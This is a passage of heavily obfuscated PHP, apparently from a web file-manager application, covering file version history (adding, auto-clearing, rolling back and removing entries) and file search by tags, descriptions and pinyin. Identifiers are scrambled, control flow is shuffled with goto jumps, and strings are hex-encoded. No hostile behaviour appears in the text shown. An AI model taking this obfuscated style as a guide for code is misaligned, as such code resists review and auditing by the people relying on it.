$AÎé‚÷Ğ›Ç[88] => isset($a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1370]]) ? $a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1370]] : null, $AÎé‚÷Ğ›Ç[218] => isset($a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1371]]) ? $a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1371]] : null, $AÎé‚÷Ğ›Ç[1338] => isset($a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1372]]) ? $a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1372]] : null); $A²Ê“ÀŒö[$AÎé‚÷Ğ›Ç[1339]] = isset($a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1373]]) ? strtotime($a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1373]]) : $A²Ê“ÀŒö[$AÎé‚÷Ğ›Ç[1338]]; return $A²Ê“ÀŒö; goto AòÊ•èè‰á; D‡‡²Í°½æ: if (!$f¾‘ÆãôÜ[$AÎé‚÷Ğ›Ç[1084]]) { return null; } $a×†Ü…˜ÂÄ = isset($f¾‘ÆãôÜ[$AÎé‚÷Ğ›Ç[1086]]) ? $f¾‘ÆãôÜ[$AÎé‚÷Ğ›Ç[1086]] : array(); if (!isset($a×†Ü…˜ÂÄ[$AÎé‚÷Ğ›Ç[1369]])) { return null; } goto b²©çäˆçî; c‘Êª‘½ƒ‡: $AÎé‚÷Ğ›Ç =& $_SERVER[£¶ä½¶¢]; if ($càä¯’Ê‹‚ == $AÎé‚÷Ğ›Ç[43] || $càä¯’Ê‹‚ == $AÎé‚÷Ğ›Ç[18]) { return array(); } $f¾‘ÆãôÜ = $this->ussRequest($càä¯’Ê‹‚, $AÎé‚÷Ğ›Ç[1368]); goto D‡‡²Í°½æ; AòÊ•èè‰á: } protected function _isFolder($dØ÷ÓË­ÚÎ) { $A½ˆÍñ·ˆ¦ =& $_SERVER[£¶ä½¶¢]; if ($dØ÷ÓË­ÚÎ == $A½ˆÍñ·ˆ¦[43] || $dØ÷ÓË­ÚÎ == $A½ˆÍñ·ˆ¦[18]) { return !0; } $aÂÅÃ¬›º = $this->_objectMeta($dØ÷ÓË­ÚÎ); return isset($aÂÅÃ¬›º[$A½ˆÍñ·ˆ¦[39]]) && $aÂÅÃ¬›º[$A½ˆÍñ·ˆ¦[39]] == $A½ˆÍñ·ˆ¦[87] ? !0 : !1; } } goto bÅä‡Õ«œ¾; AïÁ½»’à: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\x72\143\145\137\x68\151\x73\x74\157\162\x79"; public function historyCount($bÃÎÑ§ñÅ‡) { goto eÉª¤Û¼¼; dµÀ‚²á…: return array_to_keyvalue($c“ÛÂİ¦, $fÇ©¡†¿¼[403], $fÇ©¡†¿¼[488]); goto D½â¥ÊÔ; DÉ±•¾šô: $fóÃƒæã§ = array($fÇ©¡†¿¼[403], $fÇ©¡†¿¼[1722] => $fÇ©¡†¿¼[488]); $d¾Ï‘ÖŸä = array($fÇ©¡†¿¼[403] => array($fÇ©¡†¿¼[17], $bÃÎÑ§ñÅ‡)); $c“ÛÂİ¦ = $this->field($fóÃƒæã§)->where($d¾Ï‘ÖŸä)->group($fÇ©¡†¿¼[403])->select(); goto dµÀ‚²á…; eÉª¤Û¼¼: $fÇ©¡†¿¼ =& $_SERVER[£¶ä½¶¢]; if (!$bÃÎÑ§ñÅ‡) { return array(); } if (is_string($bÃÎÑ§ñÅ‡) || is_int($bÃÎÑ§ñÅ‡)) { $bÃÎÑ§ñÅ‡ = array($bÃÎÑ§ñÅ‡); } goto DÉ±•¾šô; D½â¥ÊÔ: } public function addHistory($däÅ»¯ÙÇ¡, $bµÏÁÕ†Â³ = '') { $d¬·¬íêªØ =& $_SERVER[£¶ä½¶¢]; $CÜ”»îÜØÍ = array($d¬·¬íêªØ[418] => $däÅ»¯ÙÇ¡[$d¬·¬íêªØ[403]], $d¬·¬íêªØ[1518] => isset($däÅ»¯ÙÇ¡[$d¬·¬íêªØ[442]]) ? $däÅ»¯ÙÇ¡[$d¬·¬íêªØ[442]] : $däÅ»¯ÙÇ¡[$d¬·¬íêªØ[440]], $d¬·¬íêªØ[456] => $däÅ»¯ÙÇ¡[$d¬·¬íêªØ[455]], $d¬·¬íêªØ[556] => $däÅ»¯ÙÇ¡[$d¬·¬íêªØ[88]], $d¬·¬íêªØ[1918] => $bµÏÁÕ†Â³); $bÍ¨ÉËˆŠò = $GLOBALS[$d¬·¬íêªØ[16]][$d¬·¬íêªØ[98]][$d¬·¬íêªØ[1102]]; if ($bÍ¨ÉËˆŠò > 1) { $this->historyAutoClear($CÜ”»îÜØÍ[$d¬·¬íêªØ[403]]); $this->add($CÜ”»îÜØÍ); } Hook::trigger($d¬·¬íêªØ[1919], $CÜ”»îÜØÍ); Model($d¬·¬íêªØ[1920])->eventFileEdit($däÅ»¯ÙÇ¡[$d¬·¬íêªØ[403]]); } private function historyAutoClear($DŠÈ’š‡«¨) { goto D’óÊÉ¼£; DæŠÈØƒÙÉ: $d…÷ÛÙÍË’ = array_slice($d…÷ÛÙÍË’, $f©ºùÏ¢à™); if (!$a‡‹ÜÅ…»‹ || !$d…÷ÛÙÍË’) { return; } $CêªÌŠµš = array($aå…‘â––‹[420] => array($aå…‘â––‹[17], $a‡‹ÜÅ…»‹)); goto C–ÖìÎ¬½; cëğÜº‘µÚ: $f©ºùÏ¢à™ = $Fé×Íâ°œ == $aå…‘â––‹[1124] ? 5 : $a™ç…Ï™É; if ($a™ç…Ï™É <= 1) { $f©ºùÏ¢à™ = 1; } if ($f©ºùÏ¢à™ >= 500) { return; } goto a‘à¿èõ½§; D’óÊÉ¼£: $aå…‘â––‹ =& $_SERVER[£¶ä½¶¢]; $Fé×Íâ°œ = Model($aå…‘â––‹[738])->get($aå…‘â––‹[1123]); $a™ç…Ï™É = $GLOBALS[$aå…‘â––‹[16]][$aå…‘â––‹[98]][$aå…‘â––‹[1102]]; goto cëğÜº‘µÚ; a‘à¿èõ½§: $CêªÌŠµš = array($aå…‘â––‹[418] => $DŠÈ’š‡«¨); $B×¥ƒ¿ = $this->field($aå…‘â––‹[1921])->where($CêªÌŠµš)->order($aå…‘â––‹[1915])->select(); if (!$B×¥ƒ¿ || $f©ºùÏ¢à™ >= count($B×¥ƒ¿)) { return; } goto D‘¬øö·—×; D‘¬øö·—×: $a‡‹ÜÅ…»‹ = array_to_keyvalue($B×¥ƒ¿, $aå…‘â––‹[43], $aå…‘â––‹[401]); $a‡‹ÜÅ…»‹ = array_slice($a‡‹ÜÅ…»‹, $f©ºùÏ¢à™); $d…÷ÛÙÍË’ = array_to_keyvalue($B×¥ƒ¿, $aå…‘â––‹[43], $aå…‘â––‹[455]); goto DæŠÈØƒÙÉ; C–ÖìÎ¬½: $this->where($CêªÌŠµš)->delete(); Model($aå…‘â––‹[458])->remove($d…÷ÛÙÍË’); goto F’ŠœˆĞ‘; F’ŠœˆĞ‘: } public function listData($e–‚±µƒ¥ô) { goto D‹‚çÜ…“Ñ; bòè”ù„ƒ‡: $EÉ™ˆÆ¢‚Ã = 5; if ($CÏç§‚ØÆ° == $a¥´—‡±à[1124]) { $e½ ÖÆ°ò[$a¥´—‡±à[376]] = array_slice($e½ ÖÆ°ò[$a¥´—‡±à[376]], 0, $EÉ™ˆÆ¢‚Ã); $e½ ÖÆ°ò[$a¥´—‡±à[373]] = array($a¥´—‡±à[1923] => 1, $a¥´—‡±à[1924] => 20, $a¥´—‡±à[1925] => 1, $a¥´—‡±à[1926] => count($e½ ÖÆ°ò[$a¥´—‡±à[376]])); } return $e½ ÖÆ°ò; goto f„ºøÖÎÍ†; D‹‚çÜ…“Ñ: $a¥´—‡±à =& $_SERVER[£¶ä½¶¢]; $E¬•Ô„½œ¼ = array($a¥´—‡±à[418] => $e–‚±µƒ¥ô); $aÓé°ªÜŸŒ = $a¥´—‡±à[1922]; goto d§—±å©‚¾; d§—±å©‚¾: $e½ ÖÆ°ò = $this->field($aÓé°ªÜŸŒ)->where($E¬•Ô„½œ¼)->order($a¥´—‡±à[1915])->selectPage(); $this->_listAppendUser($e½ ÖÆ°ò[$a¥´—‡±à[376]]); $CÏç§‚ØÆ° = Model($a¥´—‡±à[738])->get($a¥´—‡±à[1123]); goto bòè”ù„ƒ‡; f„ºøÖÎÍ†: } protected function _listAppendUser(&$CÊ›“Ææì‘) { $bì†öóãÃ =& $_SERVER[£¶ä½¶¢]; $d÷”¡ä¹°… = array_to_keyvalue($CÊ›“Ææì‘, $bì†öóãÃ[43], $bì†öóãÃ[1526]); $E–Í§öÈ‚ = Model($bì†öóãÃ[514])->userListInfo($d÷”¡ä¹°…); foreach ($CÊ›“Ææì‘ as &$A¿Ï‰ÜğÆ) { $cŒˆÉÒå¸ = $A¿Ï‰ÜğÆ[$bì†öóãÃ[1526]]; $A¿Ï‰ÜğÆ[$bì†öóãÃ[440]] = $E–Í§öÈ‚[$cŒˆÉÒå¸] ? $E–Í§öÈ‚[$cŒˆÉÒå¸] : !1; } unset($A¿Ï‰ÜğÆ); } public function fileInfo($E…‰®Ê‡å) { $AÙ—¯‚‰ =& $_SERVER[£¶ä½¶¢]; $eÚ„‹ÈŞÏë = $this->tablePrefix; $EºÑ®ßáŠ = "{$eÚ„‹ÈŞÏë}\151\157\x5f\x66\x69\x6c\x65\x20\x66\x69\x6c\145\163\40\x6f\156\40\x66\x69\x6c\145\x73\56\x66\x69\154\145\x49\104\x20\x3d\40\150\151\163\x74\x6f\x72\x79\56\146\x69\154\145\111\x44"; return $this->alias($AÙ—¯‚‰[1927])->where(array($AÙ—¯‚‰[420] => $E…‰®Ê‡å))->join($EºÑ®ßáŠ, $AÙ—¯‚‰[1928])->find(); } public function removeItem($Dèà™Ùù‡) { $E¤ßâÆ×‘ =& $_SERVER[£¶ä½¶¢]; $eß©áî¼µ = array($E¤ßâÆ×‘[420] => $Dèà™Ùù‡); $aòÓ“®ÇÄ‹ = $this->where($eß©áî¼µ)->find(); if ($aòÓ“®ÇÄ‹) { $E’ĞÅÎ– = $this->where($eß©áî¼µ)->delete(); Model($E¤ßâÆ×‘[458])->remove($aòÓ“®ÇÄ‹[$E¤ßâÆ×‘[455]]); return $E’ĞÅÎ–; } return !1; } public function removeBySource($d¦•³Æ´·µ) { goto fÇÎ±ˆŞ¶¯; A•„ËãºµÒ: return !0; goto F£òºÕø«Ü; fÇÎ±ˆŞ¶¯: $Fîä¾ÔÎÔº =& $_SERVER[£¶ä½¶¢]; if (!$d¦•³Æ´·µ) { return !1; } if (!is_array($d¦•³Æ´·µ)) { $d¦•³Æ´·µ = array($d¦•³Æ´·µ); } goto E…™ÊƒÀá; E…™ÊƒÀá: $cÊÍà“äÑÊ = array($Fîä¾ÔÎÔº[418] => array($Fîä¾ÔÎÔº[17], $d¦•³Æ´·µ)); $DÁ¿Ë‡Éä = $this->field($Fîä¾ÔÎÔº[456])->where($cÊÍà“äÑÊ)->select(); if ($DÁ¿Ë‡Éä) { $this->where($cÊÍà“äÑÊ)->delete(); $E¨‹—ÀÑ³ñ = array_to_keyvalue($DÁ¿Ë‡Éä, $Fîä¾ÔÎÔº[43], $Fîä¾ÔÎÔº[455]); Model($Fîä¾ÔÎÔº[458])->remove($E¨‹—ÀÑ³ñ); } goto A•„ËãºµÒ; F£òºÕø«Ü: } public function setDetail($d¬äŒ¶ì­ , $CÒ¹ï¥–Ó ) { $AºáàÏÁŒà =& $_SERVER[£¶ä½¶¢]; return $this->where(array($AºáàÏÁŒà[420] => $d¬äŒ¶ì­ ))->save(array($AºáàÏÁŒà[1918] => $CÒ¹ï¥–Ó )); } public function rollbackToItem($fà·Ö²¸š³, $B‚®³â) { goto f¦íëïõ®î; f¦íëïõ®î: $FËƒğ¦Ê÷Û =& $_SERVER[£¶ä½¶¢]; $dµÃÇÑÁŠÙ = Model($FËƒğ¦Ê÷Û[798])->sourceInfo($fà·Ö²¸š³); $this->addHistory($dµÃÇÑÁŠÙ, LNG($FËƒğ¦Ê÷Û[1929])); goto CÛ±ƒÕ½­; CÛ±ƒÕ½­: $aêœéãª¹ = $this->find($B‚®³â); $Dê«Ã¶õ¨ö = array($FËƒğ¦Ê÷Û[455] => $aêœéãª¹[$FËƒğ¦Ê÷Û[455]], $FËƒğ¦Ê÷Û[88] => $aêœéãª¹[$FËƒğ¦Ê÷Û[88]], $FËƒğ¦Ê÷Û[94] => time(), $FËƒğ¦Ê÷Û[442] => USER_ID); Model($FËƒğ¦Ê÷Û[798])->where(array($FËƒğ¦Ê÷Û[403] => $fà·Ö²¸š³))->save($Dê«Ã¶õ¨ö); goto cÙ¢£‚ÈÏ»; cÙ¢£‚ÈÏ»: return $this->where(array($FËƒğ¦Ê÷Û[420] => $B‚®³â))->delete(); goto F»ŠÓÅñË´; F»ŠÓÅñË´: } public function clearSame($B°Ÿ»Ÿ¶³ò) { goto cÃ»‚ç²é; B¾Æ•ºÖñ: $DÃˆÎİ­º‹ = array(); $eÔƒ«¤äÙ£ = array(); foreach ($cÈ“ƒÏêÕ as $DÄ·´ù‡æ») { if (!$DÄ·´ù‡æ» || count($DÄ·´ù‡æ») <= 1) { continue; } foreach ($DÄ·´ù‡æ» as $aöÌÊ„ÈÒ) { $DÃˆÎİ­º‹[] = $aöÌÊ„ÈÒ[$BÁÂÄä‡•¡[455]]; $eÔƒ«¤äÙ£[] = $aöÌÊ„ÈÒ[$BÁÂÄä‡•¡[401]]; } } goto e§å„ŠçîÃ; cÃ»‚ç²é: $BÁÂÄä‡•¡ =& $_SERVER[£¶ä½¶¢]; $d”¾†ÌàéÙ = $this->listData($B°Ÿ»Ÿ¶³ò); $cÈ“ƒÏêÕ = array_to_keyvalue_group($d”¾†ÌàéÙ, $BÁÂÄä‡•¡[455]); goto B¾Æ•ºÖñ; e§å„ŠçîÃ: if (!$eÔƒ«¤äÙ£) { return; } $this->where(array($BÁÂÄä‡•¡[401] => array($BÁÂÄä‡•¡[17], $eÔƒ«¤äÙ£)))->delete(); Model($BÁÂÄä‡•¡[458])->remove($DÃˆÎİ­º‹); goto bŠÃÂ±ŒÛÆ; bŠÃÂ±ŒÛÆ: } public function userSpace() { $cÃ—Ã¸¨³ =& $_SERVER[£¶ä½¶¢]; $CÍøåŠÌëê = $this->tablePrefix; $F÷‚™¸Ö‘¦ = array($cÃ—Ã¸¨³[1518] => USER_ID); $dÊ¡Œ‘¼ë = "{$CÍøåŠÌëê}\x69\x6f\137\x66\151\x6c\x65\40\x66\x69\x6c\145\163\40\x6f\x6e\40\x66\151\x6c\145\163\x2e\x66\151\x6c\x65\x49\104\x20\x3d\40\x68\x69\x73\x74\x6f\162\171\x2e\x66\x69\x6c\145\x49\104"; return $this->alias($cÃ—Ã¸¨³[1927])->where($F÷‚™¸Ö‘¦)->join($dÊ¡Œ‘¼ë, $cÃ—Ã¸¨³[1928])->sum($cÃ—Ã¸¨³[88]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($c–½­¶ƒª) { goto eŒé·¢Îİ¬; eŒé·¢Îİ¬: $eÍ–íˆÌ…´ =& $_SERVER[£¶ä½¶¢]; $Aƒ©÷‰‡´Ÿ = KodIO::fileTypeList(); $C´‰ŸáŒ‚’ = $Aƒ©÷‰‡´Ÿ[$c–½­¶ƒª]; goto a“Õšíê—ƒ; Eæ¶Îá˜Š: if (!$C´‰ŸáŒ‚’[$eÍ–íˆÌ…´[178]]) { $C¨œß—ó‰ = array_to_keyvalue($Aƒ©÷‰‡´Ÿ, $eÍ–íˆÌ…´[43], $eÍ–íˆÌ…´[178]); $cÙ‹„ÆšİÏ = implode($eÍ–íˆÌ…´[57], $C¨œß—ó‰); $b±Ì§­î³ = $eÍ–íˆÌ…´[1930]; } $cÑ‹œ®‰³ = explode($eÍ–íˆÌ…´[57], trim($cÙ‹„ÆšİÏ, $eÍ–íˆÌ…´[57])); return array($b±Ì§­î³, $cÑ‹œ®‰³); goto BÖä†‰¸Şè; a“Õšíê—ƒ: if (!$C´‰ŸáŒ‚’) { return array(); } $cÙ‹„ÆšİÏ = $C´‰ŸáŒ‚’[$eÍ–íˆÌ…´[178]]; $b±Ì§­î³ = $eÍ–íˆÌ…´[17]; goto Eæ¶Îá˜Š; BÖä†‰¸Şè: } public function listPathType($dÑèŞíŠ) { $E¤§¾‡»‰ë =& $_SERVER[£¶ä½¶¢]; $aƒ»¼ÏÓ¾ = $this->fileTypeWhere($dÑèŞíŠ); if (!$aƒ»¼ÏÓ¾) { return array(); } $dñ›Úà„šË = array($E¤§¾‡»‰ë[557] => SourceModel::TYPE_USER, $E¤§¾‡»‰ë[558] => USER_ID, $E¤§¾‡»‰ë[554] => 0, $E¤§¾‡»‰ë[555] => $aƒ»¼ÏÓ¾); return $this->listSource($dñ›Úà„šË); } public function listSearch($DÍÏÀÇÛŸê, $E‚»ŠæÆ„Ú = 300) { goto EµÚô…ÖÁÏ; b…ØáŒ”Óù: $this->_listSearchTag($Bé ã‹£†á, $DÍÏÀÇÛŸê, $Cé •¿ìÛĞ); $this->_listSearchGroupTag($Bé ã‹£†á, $DÍÏÀÇÛŸê, $Cé •¿ìÛĞ); $this->_listDataApply($Bé ã‹£†á[$FšÂ¥Ü“î[376]]); goto f´­í„š‡; bŞ¬Í¼ö„Å: if (!isset($a­¨åÓĞ¦[$FšÂ¥Ü“î[431]])) { $a­¨åÓĞ¦[$FšÂ¥Ü“î[431]] = 0; } $eÌ„‚èõå‰ = $FšÂ¥Ü“î[1932]; $Cé •¿ìÛĞ = $eÌ„‚èõå‰; goto f¨òÃ­¢¹µ; EµÚô…ÖÁÏ: $FšÂ¥Ü“î =& $_SERVER[£¶ä½¶¢]; if (isset($DÍÏÀÇÛŸê[$FšÂ¥Ü“î[1773]]) && $DÍÏÀÇÛŸê[$FšÂ¥Ü“î[1773]]) { $DÍÏÀÇÛŸê[$FšÂ¥Ü“î[1773]] = str_replace($FšÂ¥Ü“î[389], $FšÂ¥Ü“î[1931], trim($DÍÏÀÇÛŸê[$FšÂ¥Ü“î[1773]])); } $a­¨åÓĞ¦ = $this->_parseSearchWhere($DÍÏÀÇÛŸê); goto bŞ¬Í¼ö„Å; f¨òÃ­¢¹µ: $this->_listSearchBindPinyin($DÍÏÀÇÛŸê, $a­¨åÓĞ¦, $eÌ„‚èõå‰); $this->alias($FšÂ¥Ü“î[524])->_makeOrder(); $a­¨åÓĞ¦ = $this->parseWhereLike($a­¨åÓĞ¦); goto Bâ¹™‘ëğÅ; Bâ¹™‘ëğÅ: $Bé ã‹£†á = $this->distinct(!0)->field($eÌ„‚èõå‰)->where($a­¨åÓĞ¦)->selectPage($E‚»ŠæÆ„Ú); $this->_listSearchFileContent($Bé ã‹£†á, $DÍÏÀÇÛŸê, $Cé •¿ìÛĞ); $this->_listSearchDesc($Bé ã‹£†á, $DÍÏÀÇÛŸê, $Cé •¿ìÛĞ); goto b…ØáŒ”Óù; f´­í„š‡: $this->_listMake($Bé ã‹£†á); return $Bé ã‹£†á; goto Cµ«é†ÄÜ; Cµ«é†ÄÜ: } private function _listSearchFileContent(&$aùƒ¢ß¯­ª, $AÛôğÓ§‡, $bå•ëª†) { goto EÆİÙ‡Û; d¸Çµ“ãí›: $aùƒ¢ß¯­ª[$DéğëŸÆˆâ[376]] = array_merge($d¤¶ğˆî², $aùƒ¢ß¯­ª[$DéğëŸÆˆâ[376]]); $aùƒ¢ß¯­ª[$DéğëŸÆˆâ[373]][$DéğëŸÆˆâ[374]] += count($d¤¶ğˆî²); goto Bå¥Øƒº—á; B½ê¦¾Âìš: unset($AÛôğÓ§‡[$DéğëŸÆˆâ[455]]); $d¤¶ğˆî² = $this->field($bå•ëª†)->where($bÓ¨®ŞÏ†)->limit($DéğëŸÆˆâ[1933])->select(); if (!$d¤¶ğˆî² || count($d¤¶ğˆî²) == 0) { return; } goto d¸Çµ“ãí›; EÆİÙ‡Û: $DéğëŸÆˆâ =& $_SERVER[£¶ä½¶¢]; if (!$AÛôğÓ§‡[$DéğëŸÆˆâ[1773]] || $aùƒ¢ß¯­ª[$DéğëŸÆˆâ[373]][$DéğëŸÆˆâ[360]] > 1) { return; } $bÓ¨®ŞÏ† = $this->_parseSearchWhere($AÛôğÓ§‡); goto EæîÚµÇç‚; EæîÚµÇç‚: if (!isset($bÓ¨®ŞÏ†[$DéğëŸÆˆâ[38]]) || !is_array($AÛôğÓ§‡[$DéğëŸÆˆâ[455]])) { return; } $bÓ¨®ŞÏ†[$DéğëŸÆˆâ[455]] = array($DéğëŸÆˆâ[17], $AÛôğÓ§‡[$DéğëŸÆˆâ[455]]); unset($bÓ¨®ŞÏ†[$DéğëŸÆˆâ[38]]); goto B½ê¦¾Âìš; Bå¥Øƒº—á: } private function _listSearchTag(&$b‡ï°‘Ùš­, $c›­Í…†‰, $C¦’ã¹àƒ») { goto c’¶ˆµ÷åÎ; A›‡ã×ÅÂ: if (!$b¿¢ÄÑŞ®Ë) { return; } $a²Â…õÒ = array($F ²Ùº’Â[427] => array($F ²Ùº’Â[17], $b¿¢ÄÑŞ®Ë), $F ²Ùº’Â[1526] => USER_ID); $c¸‘Œä£Æ = Model($F ²Ùº’Â[428])->field($F ²Ùº’Â[86])->where($a²Â…õÒ)->select(); goto EÕ™Ù¯Öé; cøšåôŞõ: $b¿¢ÄÑŞ®Ë = array(); $fÅ‰°®®Œ = $c›­Í…†‰[$F ²Ùº’Â[1773]]; foreach ($EˆÕŠš†¦À as $A˜¡òÙ‚®³) { $dïÜÙ‰‚× = $A˜¡òÙ‚®³[$F ²Ùº’Â[38]]; $a§èõ±¦–Ÿ = str_replace($F ²Ùº’Â[60], $F ²Ùº’Â[43], Pinyin::encode($dïÜÙ‰‚×)); if (stripos($dïÜÙ‰‚×, $fÅ‰°®®Œ) !== !1 || stripos($a§èõ±¦–Ÿ, $fÅ‰°®®Œ) !== !1) { $b¿¢ÄÑŞ®Ë[] = $A˜¡òÙ‚®³[$F ²Ùº’Â[401]]; } } goto A›‡ã×ÅÂ; c’¶ˆµ÷åÎ: $F ²Ùº’Â =& $_SERVER[£¶ä½¶¢]; if (!$c›­Í…†‰[$F ²Ùº’Â[1773]] || $b‡ï°‘Ùš­[$F ²Ùº’Â[373]][$F ²Ùº’Â[360]] > 1) { return; } $EˆÕŠš†¦À = Model($F ²Ùº’Â[1934])->listData(); goto cøšåôŞõ; EÕ™Ù¯Öé: $c¸‘Œä£Æ = array_to_keyvalue($c¸‘Œä£Æ, $F ²Ùº’Â[43], $F ²Ùº’Â[86]); $A«³›º‰ò = array_unique($c¸‘Œä£Æ); $this->_listSearchMerge($b‡ï°‘Ùš­, $c›­Í…†‰, $C¦’ã¹àƒ», $A«³›º‰ò); goto ağ„ŠÒöÈó; ağ„ŠÒöÈó: } private function _listSearchDesc(&$e¨ğ—•µ¹¨, $bÌ¯â„é‹, $F˜ì…š®–â) { goto dƒÛÊŒªµµ; cÁ¯òØªŒÂ: $dŞÔÑâØÊ‘ = array_unique($dŞÔÑâØÊ‘); if (!$dŞÔÑâØÊ‘) { return; } $b”Š„Å˜Æ„ = array($eİÃˆÒ™ã[403] => array($eİÃˆÒ™ã[17], $dŞÔÑâØÊ‘), $eİÃˆÒ™ã[103] => $eİÃˆÒ™ã[439], $eİÃˆÒ™ã[381] => array($eİÃˆÒ™ã[388], $eİÃˆÒ™ã[1775] . $bÌ¯â„é‹[$eİÃˆÒ™ã[1773]] . $eİÃˆÒ™ã[1775])); goto e’´–´“; dƒÛÊŒªµµ: $eİÃˆÒ™ã =& $_SERVER[£¶ä½¶¢]; if (!$bÌ¯â„é‹[$eİÃˆÒ™ã[1773]] || $e¨ğ—•µ¹¨[$eİÃˆÒ™ã[373]][$eİÃˆÒ™ã[360]] > 1) { return; } $dŞÔÑâØÊ‘ = $this->listSearchChildren($bÌ¯â„é‹[$eİÃˆÒ™ã[486]]); goto cÁ¯òØªŒÂ; e’´–´“: $AŸ­¤®¢Ôù = Model($eİÃˆÒ™ã[540])->field($eİÃˆÒ™ã[403])->where($b”Š„Å˜Æ„)->select(); $B°áïÓ¥ã = array_to_keyvalue($AŸ­¤®¢Ôù, $eİÃˆÒ™ã[43], $eİÃˆÒ™ã[403]); $this->_listSearchMerge($e¨ğ—•µ¹¨, $bÌ¯â„é‹, $F˜ì…š®–â, $B°áïÓ¥ã); goto dÀĞÕŠœ÷‰; dÀĞÕŠœ÷‰: } private function _listSearchGroupTag(&$D¢Ãƒ§’‰‚, $e¤ãôÈÜ‚, $a’áèÚÏ„) { goto d°ÅèàÆÍ; d°ÅèàÆÍ: $A‹‘¿ä‰Ğ­ =& $_SERVER[£¶ä½¶¢]; if (!$e¤ãôÈÜ‚[$A‹‘¿ä‰Ğ­[1773]] || $D¢Ãƒ§’‰‚[$A‹‘¿ä‰Ğ­[373]][$A‹‘¿ä‰Ğ­[360]] > 1 || !$e¤ãôÈÜ‚[$A‹‘¿ä‰Ğ­[486]]) { return; } $B®ÈºõÅÚ˜ = $this->sourceInfo($e¤ãôÈÜ‚[$A‹‘¿ä‰Ğ­[486]]); goto eµƒŸ«À­ä; aŒá øŠÚ¡: $B×à˜†àË‹ = array_to_keyvalue($B×à˜†àË‹, $A‹‘¿ä‰Ğ­[43], $A‹‘¿ä‰Ğ­[86]); $f…ª¦äˆ« = array_unique($B×à˜†àË‹); $this->_listSearchMerge($D¢Ãƒ§’‰‚, $e¤ãôÈÜ‚, $a’áèÚÏ„, $f…ª¦äˆ«); goto aÈõñ¨¨ë†; DâÀ³ÖŞä: if (!$Dö×”’ƒ‹Ş) { return; } $cé¶…À—£ = array($A‹‘¿ä‰Ğ­[427] => array($A‹‘¿ä‰Ğ­[17], $Dö×”’ƒ‹Ş), $A‹‘¿ä‰Ğ­[1526] => 0, $A‹‘¿ä‰Ğ­[39] => $A‹‘¿ä‰Ğ­[1797] . $bİÅ‚î££); $B×à˜†àË‹ = Model($A‹‘¿ä‰Ğ­[428])->field($A‹‘¿ä‰Ğ­[86])->where($cé¶…À—£)->select(); goto aŒá øŠÚ¡; BËÍ×òĞè: $Dö×”’ƒ‹Ş = array(); $eì°¾ÑØ†… = $e¤ãôÈÜ‚[$A‹‘¿ä‰Ğ­[1773]]; foreach ($F¸ãÀŸµîÈ[$A‹‘¿ä‰Ğ­[376]] as $c÷—ÅÕ”Ò) { $B•Ğ™Ûñ·Æ = $c÷—ÅÕ”Ò[$A‹‘¿ä‰Ğ­[38]]; $e«ƒÓ–—Ù¥ = str_replace($A‹‘¿ä‰Ğ­[60], $A‹‘¿ä‰Ğ­[43], Pinyin::encode($B•Ğ™Ûñ·Æ)); if (stripos($B•Ğ™Ûñ·Æ, $eì°¾ÑØ†…) !== !1 || stripos($e«ƒÓ–—Ù¥, $eì°¾ÑØ†…) !== !1) { $Dö×”’ƒ‹Ş[] = $c÷—ÅÕ”Ò[$A‹‘¿ä‰Ğ­[401]]; } } goto DâÀ³ÖŞä; eµƒŸ«À­ä: if (!$B®ÈºõÅÚ˜ || $B®ÈºõÅÚ˜[$A‹‘¿ä‰Ğ­[412]] != SourceModel::TYPE_GROUP) { return; } $bİÅ‚î££ = $B®ÈºõÅÚ˜[$A‹‘¿ä‰Ğ­[492]]; $F¸ãÀŸµîÈ = Model($A‹‘¿ä‰Ğ­[1935])->get($bİÅ‚î££); goto BËÍ×òĞè; aÈõñ¨¨ë†: } private function _listSearchMerge(&$f¿×‚ÓñÇ, $E¢¼øİ­™Æ, $FâÃæø«„Ş, $Cä”“•ÓÕá) { goto B‘óª¦¤Ê; a…™ƒ²¸£…: $e…‚Ã´íóÏ = array_diff($Cä”“•ÓÕá, $dİò£ÅÚã•); if (!$e…‚Ã´íóÏ) { return; } $fÈ¥Êñäç = array($EŸ–Ì À¢í[403] => array($EŸ–Ì À¢í[17], $e…‚Ã´íóÏ)); goto få˜Œ¦ÀÖ²; få˜Œ¦ÀÖ²: $AÏ±èÙ…í = $this->field($FâÃæø«„Ş)->where($fÈ¥Êñäç)->select(); if (!$AÏ±èÙ…í) { return; } $c§÷Ì¿”Û = array(); goto díÁ„âùóõ; díÁ„âùóõ: foreach ($AÏ±èÙ…í as $BˆÛ‡È¢Á¢) { if ($this->_listSearchFilter($BˆÛ‡È¢Á¢, $E¢¼øİ­™Æ)) { $c§÷Ì¿”Û[] = $BˆÛ‡È¢Á¢; } } $f¿×‚ÓñÇ[$EŸ–Ì À¢í[376]] = array_merge($c§÷Ì¿”Û, $f¿×‚ÓñÇ[$EŸ–Ì À¢í[376]]); $f¿×‚ÓñÇ[$EŸ–Ì À¢í[373]][$EŸ–Ì À¢í[374]] += count($c§÷Ì¿”Û); goto dÜ’¼ËÏİ¨; B‘óª¦¤Ê: $EŸ–Ì À¢í =& $_SERVER[£¶ä½¶¢]; if (!$Cä”“•ÓÕá) { return; } $dİò£ÅÚã• = array_to_keyvalue($f¿×‚ÓñÇ[$EŸ–Ì À¢í[376]], $EŸ–Ì À¢í[43], $EŸ–Ì À¢í[403]); goto a…™ƒ²¸£…; dÜ’¼ËÏİ¨: } private function _listSearchFilter($c¨áõ¥¯à, $e’ŸÔå²œ­) { goto Eïª©Îôø; F”ˆßµŠ‰: if (isset($e’ŸÔå²œ­[$d‘’¢«•Ö“[413]]) && $e’ŸÔå²œ­[$d‘’¢«•Ö“[413]] != $d‘’¢«•Ö“[1740]) { if ($e’ŸÔå²œ­[$d‘’¢«•Ö“[413]] == $d‘’¢«•Ö“[87] && !$E¨„Ì–ŞÃæ) { return !1; } if ($e’ŸÔå²œ­[$d‘’¢«•Ö“[413]] != $d‘’¢«•Ö“[87] && $E¨„Ì–ŞÃæ) { return !1; } if 